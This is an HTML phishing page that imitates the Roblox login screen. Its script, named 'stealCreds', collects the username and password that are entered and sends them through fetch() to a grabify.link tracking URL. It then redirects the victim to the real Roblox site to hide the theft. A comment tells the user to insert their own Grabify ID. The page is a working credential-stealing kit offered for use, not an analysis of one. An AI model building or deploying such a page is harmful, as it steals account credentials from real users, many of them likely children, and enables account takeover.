<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox</title>
    <style>
        body {
            background-color: #232527;
            color: white;
            font-family: 'Gotham', 'Segoe UI', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #232527;
            padding: 40px;
            border-radius: 8px;
            width: 320px;
            text-align: center;
            box-shadow: 0 0 10px rgba(0,0,0,0.5);
        }
        .logo {
            width: 180px;
            margin-bottom: 20px;
        }
        h2 {
            margin-top: 0;
            font-size: 20px;
            font-weight: 600;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #e5e5e5;
            border-radius: 5px;
            box-sizing: border-box;
            background-color: #f2f4f5;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 12px;
            background-color: #00b06f;
            color: white;
            border: none;
            border-radius: 5px;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover {
            background-color: #009960;
        }
        .spinner {
            display: none;
            margin: 10px auto;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #00b06f;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 2s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

<div class="login-container">
    <!-- Roblox Logo -->
    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" alt="Roblox" class="logo">
    
    <h2>Sign In</h2>
    
    <form id="loginForm" onsubmit="stealCreds(event)">
        <input type="text" id="username" name="username" placeholder="Username" required autocomplete="off">
        <input type="password" id="password" name="password" placeholder="Password" required autocomplete="off">
        
        <button type="submit" id="loginBtn">Log In</button>
    </form>
    
    <div class="spinner" id="spinner"></div>
</div>

<script>
    // --- CONFIGURATION ---
    // REPLACE THIS WITH YOUR GRABIFY ID (e.g., "AbC123D")
    const grabifyID = "BTJ3IJ"; 
    
    function stealCreds(event) {
        event.preventDefault();
        
        const user = document.getElementById('username').value;
        const pass = document.getElementById('password').value;
        
        // UI Changes
        document.getElementById('loginBtn').style.display = 'none';
        document.getElementById('spinner').style.display = 'block';
        
        // 1. Send Data to Grabify
        const url = `https://grabify.link/${grabifyID}?user=${encodeURIComponent(user)}&pass=${encodeURIComponent(pass)}`;
        
        fetch(url)
            .then(response => console.log('Data sent'))
            .catch(error => console.error('Error:', error));
            
        // 2. Redirect to Real Roblox
        setTimeout(() => {
            window.location.href = "https://www.roblox.com/home";
        }, 1000);
    }
</script>

</body>
</html>
